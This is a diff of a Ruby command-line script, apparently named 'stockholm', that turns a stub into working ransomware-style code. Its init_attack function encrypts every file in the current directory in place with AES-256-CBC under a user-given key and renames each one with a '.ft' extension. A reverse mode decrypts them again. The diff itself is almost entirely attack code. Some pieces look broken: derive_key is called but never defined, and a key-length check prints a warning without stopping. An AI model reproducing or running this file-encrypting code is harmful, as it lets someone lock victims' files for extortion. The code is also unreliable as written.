@@ -1,13 +1,14 @@
 #!/usr/bin/env ruby 
 
 require 'optparse'
+require 'openssl'
 
 class Config 
   attr_accessor :silence, :key, :reverse
 
-  def initialize(silence=false, key=nil, reverse=false)
-    @silence = silence 
+  def initialize(key, silence=false, reverse=false)
     @key = key 
+    @silence = silence 
     @reverse = reverse 
   end 
 end
@@ -27,6 +28,9 @@ def version(conf)
 end
 
 def options(input, config)
+  if input.size > 3
+    usage()
+  end
   OptionParser.new do |opts|
   opts.on("-s", "--silence", "silence the output") do |s|
     config.silence = true
@@ -42,6 +46,12 @@ def options(input, config)
       config.reverse = true
     end
       end.parse!
+end
+
+def check_conf(config)
+  if config.key.size < 16 
+    print(false, "[STOCKHOLM] key must be at least 16 characters")
+  end
 end
 
 def check_dir(config)
@@ -62,20 +72,70 @@ def check_dir(config)
   # end
 end
 
+def encrypt(file, password)
+  cipher = OpenSSL::Cipher.new('aes-256-cbc')
+  cipher.encrypt
+
+  key = derive_key(password)
+  cipher.key = key
+  iv = cipher.random_iv
+
+  data = File.binread(file)
+  encrypted = cipher.update(data) + cipher.final
+
+  File.binwrite(file, iv + encrypted)
+
+  File.rename(file, file + ".ft") unless file.end_with?(".ft")
+end
+
+def decrypt(file, password)
+ data = File.binread(file)
+
+  iv = data[0,16]
+  encrypted = data[16..]
+
+  cipher = OpenSSL::Cipher.new('aes-256-cbc')
+  cipher.decrypt
+
+  key = derive_key(password)
+  cipher.key = key
+  cipher.iv = iv
+
+  decrypted = cipher.update(encrypted) + cipher.final
+
+  File.binwrite(file, decrypted)
+
+  new_name = file.sub(/\.ft$/, '')
+  File.rename(file, new_name)
+end
+
 def init_attack(config)
-  print (config.silence, "[STOCKHOLM] Encrypting files")
-  #Find the files and start encripting everything 
-  #encrypt_files()
-  #change_extension(file)
+  print(config.silence, "[STOCKHOLM] Encrypting files:")
+  Dir.glob('*').each do |file|
+    next if file == "stockholm"
+    encrypt(file, config.key)
+  end
+end
+
+def reverse_attack(config)
+  print(config.silence, "[STOCKHOLM] Decrypting files:")
+  Dir.glob('*').each do |file|
+    next if file == "stockholm"
+    decrypt(file, config.key)
+  end
 end
 
 def main()
   input = ARGV
-  conf = Config.new()
+  key = ARGV[-1]
+  conf = Config.new(key)
   options(input, conf) 
+  check_conf(conf)
+  check_dir(conf)
   if !conf.reverse
-    check_dir(conf)
     init_attack(conf)
+  else
+    reverse_attack(conf)  
   end
 end
 
